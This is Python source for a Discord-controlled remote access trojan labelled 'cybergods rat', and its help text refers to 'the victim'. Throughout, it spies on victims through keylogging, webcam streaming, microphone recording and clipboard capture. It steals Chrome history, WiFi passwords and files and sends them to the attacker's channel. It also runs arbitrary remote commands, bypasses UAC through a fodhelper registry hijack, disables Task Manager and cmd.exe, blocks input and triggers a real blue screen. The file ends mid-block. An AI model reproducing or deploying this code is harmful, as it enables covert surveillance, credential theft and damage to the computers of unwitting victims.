import webbrowser
import os
import cv2
import logging
import threading
from pynput.keyboard import Listener
import getpass
import discord
import random
import asyncio
import ctypes
import socket
import pyautogui
from ctypes import wintypes
import psutil
import platform
import requests
import subprocess
from discord.ext import commands


intents = discord.Intents.default()
intents.typing = False
intents.presences = False

def GetIP():
    ip = requests.get("https://api.ipify.org").text
    return ip

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

DisFunc = commands.Bot(description='DisFunc', command_prefix='?', bot=True, intents=intents)
DisFunc.remove_command('help')
loop = asyncio.get_event_loop()

@DisFunc.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('Command not found!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Missing argument!')

@DisFunc.event
async def on_ready():
    hostname = socket.gethostname()
    channel = DisFunc.get_channel(1115017737257893888)  # Replace with your desired channel ID 
    user = getpass.getuser()
    ip = GetIP()
    embed2 = discord.Embed(title="cybergods rat Started", description="Created by linux_adam")
    embed = discord.Embed(title=':white_check_mark: DisFunc Connection', description='** **', colour=discord.Color.random())
    embed.add_field(name=f':computer: Hostname: `{hostname}`', value='** **', inline=False)
    embed.add_field(name=f':man: User: `{user}`', value='** **', inline=False)
    embed.add_field(name=':globe_with_meridians: IP: `' + ip + '`', value='** **', inline=False)
    embed.add_field(name=':keyboard: Prefix: `?`', value='** **', inline=False)
    embed.set_footer(text='Credit to [syntheticlol](https://github.com/syntheticlol)')
    await channel.send(embed=embed2)
    await channel.send(embed=embed)
    await channel.send("To execute commands, please respond to bot messages.")
    






@DisFunc.command()
async def blockinput(ctx):
    BlockInput = ctypes.windll.user32.BlockInput
    BlockInput.argtypes = [wintypes.BOOL]
    BlockInput.restype = wintypes.BOOL

    blocked = BlockInput(True)
    if blocked:
        await ctx.send('input blocked')
    else:
        await ctx.send('already blocked or program doesnt have administator')


@DisFunc.command()
async def unblockinput(ctx):
    BlockInput = ctypes.windll.user32.BlockInput
    BlockInput.argtypes = [wintypes.BOOL]
    BlockInput.restype = wintypes.BOOL

    blocked = BlockInput(False)
    if not blocked:
        await ctx.send("Input unblocked.")
    else:
        await ctx.send("Failed to unblock input.")


import discord
import os
import time
import cv2
import threading
import sys
import pathlib
import subprocess

@DisFunc.command()

async def streamwebcam(ctx):
    await ctx.send("[*] Command successfully executed")
    
    temp = os.getenv('TEMP')
    camera_port = 0
    camera = cv2.VideoCapture(camera_port)
    temp_folder = os.path.join(temp, "hobo")
    pathlib.Path(temp_folder).mkdir(parents=True, exist_ok=True)
    file = os.path.join(temp_folder, "hello.txt")
    
    while True:
        return_value, image = camera.read()
        cv2.imwrite(os.path.join(temp, "temp.png"), image)
        boom = discord.File(os.path.join(temp, "temp.png"), filename="temp.png")
        kool = await ctx.send(file=boom)
        
        if os.path.isfile(file):
            del camera
            break
        else:
            continue
    
    subprocess.run(["del", file, "/f"], shell=True, check=True)
    subprocess.run(["RMDIR", temp_folder, "/s", "/q"], shell=True, check=True)




@DisFunc.command()
async def stopwebcam(ctx):
            import os
            os.system(r"mkdir %temp%\hobo")
            os.system(r"echo hello>%temp%\hobo\hello.txt")
            os.system(r"del %temp\temp.png /F")


import discord
import os
import sounddevice as sd
from scipy.io.wavfile import write
import requests
from discord.ext import commands
@DisFunc.command()
async def record(ctx, seconds: float):
    temp = (os.getenv('TEMP'))
    fs = 44100
    laco = temp + r"\output.wav"
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(laco, fs, myrecording)
    check = os.stat(laco).st_size
    if check > 7340032:
        await ctx.send("This may take some time because it is over 8 MB. Please wait...")
        boom = requests.post('https://file.io/', files={"file": open(laco, "rb")}).json()["link"]
        await ctx.send("Audio download link: " + boom)
        await ctx.send("[*] Command successfully executed.")
        os.remove(laco)
    else:
        file = discord.File(laco, filename="output.wav")
        await ctx.send("[*] Command successfully executed.", file=file)
        os.remove(laco)


@DisFunc.command()
async def clipboard(ctx):
    
    import os
    
    CF_TEXT = 1
    kernel32 = ctypes.windll.kernel32
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32 = ctypes.windll.user32
    user32.GetClipboardData.restype = ctypes.c_void_p
    
    user32.OpenClipboard(0)
    
    if user32.IsClipboardFormatAvailable(CF_TEXT):
        data = user32.GetClipboardData(CF_TEXT)
        data_locked = kernel32.GlobalLock(data)
        text = ctypes.c_char_p(data_locked)
        value = text.value
        kernel32.GlobalUnlock(data_locked)
        body = value.decode()
        user32.CloseClipboard()
        
        embed = discord.Embed(title="Clipboard content is:", description=body, color=0x00ff00)
        await ctx.send(embed=embed)







import discord

import threading
import win32con
import win32gui

from discord.ext import commands



@DisFunc.command()
async def message(ctx, *, msg):
    MB_YESNO = 0x04
    MB_HELP = 0x4000
    ICON_STOP = 0x10

    def mess():
        ctypes.windll.user32.MessageBoxW(0, msg, "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box

    messa = threading.Thread(target=mess)
    messa._running = True
    messa.daemon = True
    messa.start()

    def get_all_hwnd(hwnd, mouse):
        def winEnumHandler(hwnd, ctx):
            if win32gui.GetWindowText(hwnd) == "Error":
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                return None
            else:
                pass

        if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
            win32gui.EnumWindows(winEnumHandler, None)

    win32gui.EnumWindows(get_all_hwnd, 0)






@DisFunc.command()
async def history(ctx):
            import sqlite3
            import os
            import time
            import shutil
            temp = (os.getenv('TEMP'))
            Username = (os.getenv('USERNAME'))
            shutil.rmtree(temp + r"\history12", ignore_errors=True)
            os.mkdir(temp + r"\history12")
            path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
            path_new = temp + r"\history12"
            copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
            os.system(copy_me_to_here)
            con = sqlite3.connect(path_new + r"\history")
            cursor = con.cursor()
            cursor.execute("SELECT url FROM urls")
            urls = cursor.fetchall()
            for x in urls:
                done = ("".join(x))
                f4 = open(temp + r"\history12" + r"\history.txt", 'a')
                f4.write(str(done))
                f4.write(str("\n"))
                f4.close()
            con.close()
            file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
            await ctx.channel.send("[*] Command successfuly executed", file=file)
            def deleteme() :
                path = "rmdir " + temp + r"\history12" + " /s /q"
                os.system(path)
            deleteme()







import shutil
import subprocess
import os

@DisFunc.command()
async def bluescreen(ctx):
    
    import ctypes.wintypes
    
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    
    await ctx.send('Blue screen triggered.')
    
    

import shutil
import subprocess
import os


    
    
    

    
    
    
    
    

import shlex
import subprocess

@DisFunc.command()
async def cmd(ctx, *, cmds):
    await ctx.message.delete()

    try:
        args = shlex.split(cmds)
        proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output, _ = proc.communicate(timeout=10)

        if output:
            decoded_output = output.decode('utf-8', errors='replace')
            decoded_output = decoded_output.replace('\x00', '')  # remove null characters
            decoded_output = decoded_output.replace('\x0c', '')  # remove form feed characters
            decoded_output = ''.join([i if ord(i) < 128 else '?' for i in decoded_output])  # replace non-ascii characters with ?
            file_name = "output.txt"
            with open(file_name, "w", encoding='utf-8') as f:
                f.write(decoded_output)
            with open(file_name, "rb") as f:
                await ctx.send(file=discord.File(f, file_name))
            os.remove(file_name)
        else:
            await ctx.send("Command executed successfully.")
    except subprocess.TimeoutExpired:
        await ctx.send("Command timed out.")
    except Exception as e:
        await ctx.send(f"Command failed with error: {e}")








@DisFunc.command()
async def upload(ctx, *, file_info):
    components = file_info.split()
    filepath = " ".join(components[:-1])  # Join the path components, excluding the last element
    channel_id = components[-1]  # Get the last element as the channel ID

    channel = DisFunc.get_channel(int(channel_id))
    if os.path.exists(filepath):
        await channel.send(file=discord.File(filepath))
        await ctx.send(f'File uploaded to channel: {channel.mention}')
    else:
        await ctx.send('File not found!')













@DisFunc.command()
async def website(ctx, websiteu: str):
    try:
        webbrowser.open(websiteu)
        await ctx.send(f"Opened website: {websiteu}")
    except webbrowser.Error:
        await ctx.send("Failed to open website")







@DisFunc.command()
async def admincheck(message):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Congrats you're admin")
            elif is_admin == False:
                await message.channel.send("[!] Sorry, you're not admin")




@DisFunc.command()
async def ahah(ctx):
    website = "https://www.youtube.com/watch?v=poMXl_nOAXU"
    windows = 100
    for _ in range(windows):
        webbrowser.open(website)
    await ctx.send("ahlayan kadın sesi acılıyor")






















    
helpmenu = """
Availaible commands are :
?admincheck checks if admin
?history - Gets the Chrome browsing history
?ps <command> - Runs a command in PowerShell
?cmd <command> - Executes a command (only `whoami` command works)
?upload <path> <channel_id> - Uploads a file from victim's machine to the specified channel
?nano <filepath> - Writes contents to a file using nano editor
?screenshot - Gets a screenshot of the victim's computer
?furryporn - Views furry pornography (not recommended)
?rickroll - Plays the "Never Gonna Give You Up" song by Rick Astley (not recommended)
?usage - Shows CPU and RAM usage of the victim's machine
?ahah - Plays a special sound for Turkish people
?download <link> - Downloads a file from a URL
?website <url> - Opens a website of choice
?execpy <python command> - Executes a Python command provided by the user
?execpyfile - Executes a provided .py file
?execbat <executable .bat file> - Executes a provided .bat file
?sysinfo - Shows system information of the victim's machine
?cd - Changes the current directory (usage: cd C:\\ - use two backslashes instead of one)
?webcam - Captures an image from the victim's webcam
?hide - Hides a specified .exe or .py file
?unhide - Unhides a specified .exe or .py file
?streamwebcam - Streams the victim's webcam (may be glitchy)
?stopwebcam - Stops streaming the victim's webcam
?takeovercomputer - Takes over the victim's machine, blocks keyboard and mouse input, adds program to startup, and executes a command that may require the victim to fully format their machine
?unblockinput - Unblocks input on the victim's machine
?blockinput - Blocks input on the victim's machine (mouse, keyboard, etc.)
?clipboard - Shows the contents of the victim's clipboard
?bluescreen - Shows Blue Screen of Death (BSOD) not fake its real
?blockcmd - Kills cmd.exe even if it's running as an administrator
?unblockcmd - Unblocks cmd.exe
?hideexecpyfile <attached file> - Hides
?startkeylogger - Starts recording keystrokes (use ?dumpkeylogger to get the keylog after stopping the keylogger)
?stopkeylogger - Stops recording keystrokes
?dumpkeylogger - Provides the recorded keylog while the keylogger was running
?voice <anything to say> - Makes the victim's machine say something
?message <your message> - Sends an error message to the victim
?uacbypass - Attempts to bypass User Account Control (UAC) to gain administrator privileges (may be detected by antivirus software)
?askadmin - Asks the victim for administrator privileges and opens a terminal if accepted (not recommended a provided .py file (only works on administrator accounts)
?record - Records the victim's voice)
"""

      


import os
from discord import File

@DisFunc.command()
async def help(ctx):
 
   
    temp_dir = os.getenv('TEMP')
    file_path = os.path.join(temp_dir, "helpmenu.txt")
    with open(file_path, 'w') as f:
        f.write(helpmenu)
    if os.path.exists(file_path):
        file = File(file_path, filename="helpmenu.txt")
        await ctx.send("[*] Command successfuly executed", file=file)
        os.remove(file_path)



@DisFunc.command()
async def cd(ctx):
   
     os.chdir(ctx.message.content[4:])
     await ctx.channel.send("[*] Command successfully executed")
     





import discord
import asyncio
import os
import sys

import inspect
import winreg
import time

from discord.ext import commands





@DisFunc.command()
async def wifipas(message):
            
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    import os
                    import subprocess
                    import json
                    x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                    x = x[x.find("User profiles\r\n-------------\r\n")+len("User profiles\r\n-------------\r\n"):len(x)].replace('\r\n\r\n"',"").replace('All User Profile', r'"All User Profile"')[4:]
                    lst = []
                    done = []
                    for i in x.splitlines():
                        i = i.replace('"All User Profile"     : ',"")
                        b = -1
                        while True:
                            b = b + 1
                            if i.startswith(" "):
                                i = i[1:]
                            if b >= len(i):
                                break
                        lst.append(i)
                    lst.remove('')
                    for e in lst:
                        output = subprocess.run('NETSH WLAN SHOW PROFILE "' + e + '" KEY=CLEAR ', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                        for i in output.splitlines():
                            if i.find("Key Content") != -1:
                                ok = i[4:].replace("Key Content            : ","")
                                break
                        almoast = '"' + e + '"' + ":" + '"' + ok + '"'
                        done.append(almoast)
                    await message.channel.send("[*] Command successfuly executed")  
                    await message.channel.send(done)
            else:
                await message.channel.send("[*] This command requires admin privileges")

@DisFunc.command()
async def askadmin(ctx):
    def isAdmin():
        try:
            is_admin = (os.getuid() == 0)
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin
    
    if isAdmin():
        await ctx.send("You are already an admin!")
    else:
        cmd = " ".join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        time.sleep(1)
        os.system("echo " + cmd + " | powershell -Command \"$input | Invoke-Expression\"")
        await ctx.send("Admin access obtained!")

@DisFunc.command()
async def blockcmd(ctx):
    await ctx.message.delete()

    if hasattr(ctx.bot, "is_blocking_cmd") and ctx.bot.is_blocking_cmd:
        await ctx.send("Command is already blocking cmd.")
        return

    ctx.bot.is_blocking_cmd = True

    process_name = "cmd.exe"
    interval = 0  

    async def check_cmd():
        while ctx.bot.is_blocking_cmd:
            try:
                for proc in psutil.process_iter():
                    if proc.name() == process_name:
                        proc.kill()
                        await ctx.send(f"{process_name} has been killed.")
                await asyncio.sleep(interval)
            except psutil.AccessDenied:
                await ctx.send("Access denied. Please run the bot as administrator.")
                break
            except Exception as e:
                await ctx.send(f"An error occurred: {e}")
                break

    ctx.bot.checker_task = asyncio.create_task(check_cmd())
    await ctx.send("Command is now blocking cmd.")

@DisFunc.command()
async def unblockcmd(ctx):
    await ctx.message.delete()

    if hasattr(ctx.bot, "is_blocking_cmd") and not ctx.bot.is_blocking_cmd:
        await ctx.send("Command is not blocking cmd.")
        return

    ctx.bot.is_blocking_cmd = False
    await ctx.send("Command is no longer blocking cmd.")











@DisFunc.command()
async def uacbypass(message):
            import winreg
           
            import sys
            import os
            import time
            import inspect
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                await message.channel.send("Your already admin!")
            else:
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                await message.channel.send("attempting to get admin little glichty 2 bot start to execute your commands if you want to execute commands using administator use ?ps it will execute commands as administator not bot powershell commands ")
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if not isexe:
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                    
                else:
                    test_str = sys.argv[0]
                    current_dir = test_str
                    cmd2 = current_dir
                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                    
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
                os.system(remove_reg)








import discord
import os
import win32com.client as wincl

import threading
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands



def volume_up():
    # Get default audio playback device
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    # Unmute the audio device if it's currently muted
    if volume.GetMute() == 1:
        volume.SetMute(0, None)

    # Increase the system volume to the maximum level
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

    # Simulate a key press of the volume up key to ensure that the volume change is reflected in the UI
    ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)

@DisFunc.command()
async def voice(ctx, *, message):
    # Increase system volume
    volume_thread = threading.Thread(target=volume_up)
    volume_thread.start()

    # Speak message using TTS API
    speak = wincl.Dispatch("SAPI.SpVoice")
    speak.Speak(message)

    # Send confirmation message to Discord channel
    await ctx.send("[*] Command successfully executed.")


@DisFunc.command()
async def execbat(ctx):
    attachments = ctx.message.attachments
    if not attachments:
        await ctx.send('No file attached.')
        return

    attachment = attachments[0]
    if not attachment.filename.endswith('.bat'):
        await ctx.send('Invalid file format. Only .bat files are supported.')
        return

    file_path = attachment.filename
    try:
        await attachment.save(file_path)
        result = subprocess.run(file_path, capture_output=True, text=True, shell=True)
        output = result.stdout if result.stdout else result.stderr
        with open('output.txt', 'w') as f:
            f.write(output)
        with open('output.txt', 'rb') as f:
            await ctx.send(file=discord.File(f, 'output.txt'))
    except Exception as e:
        await ctx.send(f'An error occurred while executing the command:\n```{str(e)}```')
    finally:
        # Delete the file after execution
        subprocess.run(f'del {file_path}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(f'del output.txt', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)















@DisFunc.command()
async def unhide(message):
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib -h "{}" """.format(cmd237))
            await message.channel.send("[*] Command successfuly executed")

@DisFunc.command()
async def hide(message):
            import os
            import inspect
            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib +h "{}" """.format(cmd237))
            await message.channel.send("[*] Command successfuly executed")





@DisFunc.command()
async def hideexecpyfile(ctx):
    attachments = ctx.message.attachments
    if not attachments:
        await ctx.send('No file attached.')
        return

    attachment = attachments[0]
    if not attachment.filename.endswith('.py'):
        await ctx.send('Invalid file format. Only .py files are supported.')
        return

    # Generate a random file name with 20 characters
    random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    file_name = f'{random_name}.py'
    
    try:
        # Save the file to disk
        await attachment.save(file_name)

        # Move the file to the C:\ directory
        new_file_path = os.path.join('C:\\', file_name)
        shutil.move(file_name, new_file_path)

        # Execute the file using python.exe
        result = subprocess.run(f'python.exe {new_file_path}', capture_output=True, text=True, shell=True)
        output = result.stdout if result.stdout else result.stderr

        # Send the output as a file attachment
        with open('output.txt', 'w') as f:
            f.write(output)
        with open('output.txt', 'rb') as f:
            await ctx.send(file=discord.File(f, 'output.txt'))
    except Exception as e:
        await ctx.send(f'An error occurred while executing the command:\n```{str(e)}```')
    finally:
        # Delete the file after execution
        subprocess.run(f'del {new_file_path}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(f'del output.txt', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

@DisFunc.command()
async def execpyfile(ctx):
    attachments = ctx.message.attachments
    if not attachments:
        await ctx.send('No file attached.')
        return

    attachment = attachments[0]
    if not attachment.filename.endswith('.py'):
        await ctx.send('Invalid file format. Only .py files are supported.')
        return

    file_path = attachment.filename
    try:
        await attachment.save(file_path)
        result = subprocess.run(['python', file_path], capture_output=True, text=True, shell=True)
        output = result.stdout if result.stdout else result.stderr
        await ctx.send(f'Command executed:\n```{output}```')
    except Exception as e:
        await ctx.send(f'An error occurred while executing the command:\n```{str(e)}```')
    finally:
        # Delete the file after execution
        subprocess.run(f'del {file_path}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)



@DisFunc.command()
async def sysinfo(ctx):
    # Get system information using platform module
    system_info = platform.uname()

    # Get CPU usage percentage
    cpu_usage = psutil.cpu_percent()

    # Get memory usage
    memory = psutil.virtual_memory()
    total_memory = round(memory.total / (1024 ** 3), 2)
    used_memory = round(memory.used / (1024 ** 3), 2)
    memory_usage = memory.percent

    # Create an embed message with system information
    embed = discord.Embed(title="System Information", color=discord.Color.blue())
    embed.add_field(name="System", value=f"```{system_info.system}```", inline=False)
    embed.add_field(name="Node Name", value=f"```{system_info.node}```", inline=True)
    embed.add_field(name="Release", value=f"```{system_info.release}```", inline=True)
    embed.add_field(name="Version", value=f"```{system_info.version}```", inline=True)
    embed.add_field(name="Machine", value=f"```{system_info.machine}```", inline=True)
    embed.add_field(name="Processor", value=f"```{system_info.processor}```", inline=True)
    embed.add_field(name="CPU Usage", value=f"```{cpu_usage}%```", inline=False)
    embed.add_field(name="Memory Usage", value=f"```{used_memory} GB / {total_memory} GB ({memory_usage}%)```", inline=False)

    await ctx.send(embed=embed)







@DisFunc.command()
async def distaskmgr(message):
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statuuusss
                import time
                statuuusss = None
                import subprocess
                import os
                instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statuuusss = "ok"
                    return output
                import threading
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    import winreg as reg
                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                else:
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")



import ctypes
import subprocess
import winreg

@DisFunc.command()
async def enbtaskmgr(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    if is_admin:
        instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
        output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        if len(output.stdout) <= 5:
            await ctx.send("[*] Task Manager is already enabled.")
        else:
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                await ctx.send("[*] Task Manager has been enabled.")
            except Exception as e:
                await ctx.send(f"[*] Failed to enable Task Manager with error: {e}")
    else:
        await ctx.send("[*] This command requires admin privileges.")

import shlex
import subprocess

@DisFunc.command()
async def ps2(ctx, *, cmds):
    await ctx.message.delete()

    try:
        command = f'powershell -command "{cmds}"'
        args = shlex.split(command)
        proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output, _ = proc.communicate(timeout=10)

        if output:
            decoded_output = output.decode('utf-8', errors='replace')
            await ctx.send(f"```{decoded_output}```")
        else:
            await ctx.send("Command executed successfully.")
    except subprocess.TimeoutExpired:
        await ctx.send("Command timed out.")
    except Exception as e:
        await ctx.send(f"Command failed with error: {e}")

import os

import discord
from discord.ext import commands
import subprocess
import shlex
import os
import getpass



@DisFunc.command()
async def ps(ctx, *, cmds):
    await ctx.message.delete()

    try:
        command = f'powershell -command "{cmds}"'
        args = shlex.split(command)
        proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output, _ = proc.communicate(timeout=10)

        if output:
            decoded_output = output.decode('utf-8', errors='replace')
            decoded_output = decoded_output.replace('\x00', '')  # remove null characters
            decoded_output = decoded_output.replace('\x0c', '')  # remove form feed characters
            decoded_output = ''.join([i if ord(i) < 128 else '?' for i in decoded_output])  # replace non-ascii characters with ?
            file_name = os.path.join(os.path.expanduser('~'), 'Desktop', 'output.txt')
            with open(file_name, "w", encoding='utf-8') as f:
                f.write(decoded_output)
            with open(file_name, "rb") as f:
                await ctx.send(file=discord.File(f, file_name))
            os.remove(file_name)
        else:
            await ctx.send("Command executed successfully.")
    except subprocess.TimeoutExpired:
        await ctx.send("Command timed out.")
    except Exception as e:
        await ctx.send(f"Command failed with error: {e}")

@DisFunc.command()
async def nano(ctx, filepath, *, content=""):
    try:
        if not content:
            # If no content is provided, read and send the existing file content
            with open(filepath, 'r') as file:
                file_content = file.read()
            await ctx.send(f"```{file_content}```")
        else:
            # Write the provided content to the file
            with open(filepath, 'w') as file:
                file.write(content)
            await ctx.send(f"File '{filepath}' has been created and written.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")





@DisFunc.command()
async def furryporn(ctx):
    website = "https://www.pornhub.com/view_video.php?viewkey=63d567c6732bd"
    windows = 100
    for _ in range(windows):
        webbrowser.open(website)
    await ctx.send("Opening furryporn video...")

@DisFunc.command()
async def rickroll(ctx):
    website = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    windows = 100
    for _ in range(windows):
        webbrowser.open(website)
    await ctx.send("Opening rickroll video...")
    
    

    
    
    
    
    
    
   
@DisFunc.command()
async def download(ctx, url: str):
    response = requests.get(url)
    if response.status_code == 200:
        file_name = url.split('/')[-1]
        with open(file_name, 'wb') as file:
            file.write(response.content)
        await ctx.send(f"File downloaded: {file_name}")
    else:
        await ctx.send("Failed to download file.")

#keyloggers :
@DisFunc.command()
async def dumpkeylogger(ctx):
    temp = os.getenv("TEMP")
    file_keys = temp + r"\key_log.txt"
    file = discord.File(file_keys, filename="key_log.txt")
    await ctx.send("[*] Command successfully executed.", file=file)
    os.remove(file_keys)
   
@DisFunc.command()
async def startkeylogger(ctx):
    temp = os.getenv("TEMP")
    log_dir = temp
    logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))
    global test
    test = Listener(on_press=on_press)
    test.start()
    await ctx.send("[*] Keylogger successfully started.")

@DisFunc.command()
async def stopkeylogger(ctx):
    global test
    test.stop()
    await ctx.send("[*] Keylogger successfully stopped.")





@DisFunc.command()
async def usage(ctx):
    disku = psutil.disk_usage("/")
    totaldick = round(disku.total / (1024 ** 3), 2)
    useddick = round(disku.used / (1024 ** 3), 2)
    dickperc = disku.percent

    cpuperc = psutil.cpu_percent()
    mem = psutil.virtual_memory()
    totalram = round(mem.total / (1024 ** 3), 2)
    usedram = round(mem.used / (1024 ** 3), 2)
    ramperc = mem.percent

    embed = discord.Embed(title="System Usage", color=discord.Color.purple())
    embed.add_field(name="Disk", value=f"```{useddick} GB / {totaldick} GB ({dickperc}%)```", inline=False)
    embed.add_field(name="CPU", value=f"```{cpuperc}%```", inline=False)
    embed.add_field(name="RAM", value=f"```{usedram} GB / {totalram} GB ({ramperc}%)```", inline=False)

    await ctx.send(embed=embed)


@DisFunc.command()
async def screenshot(ctx):
    try:
        # Capture the screenshot
        screenshot = pyautogui.screenshot()
        # Save the screenshot as a file
        screenshot.save('screenshot.png')
        # Send the screenshot file in the Discord channel
        await ctx.send("Screenshot", file=discord.File('screenshot.png'))
    except Exception as e:
        await ctx.send(f"An error occurred while capturing the screenshot: {str(e)}")

# Replace with your bot token
loop.create_task(DisFunc.start(''))

try:
    loop.run_forever()
except KeyboardInterrupt:
    loop.run_until_complete(DisFunc.close())
finally:
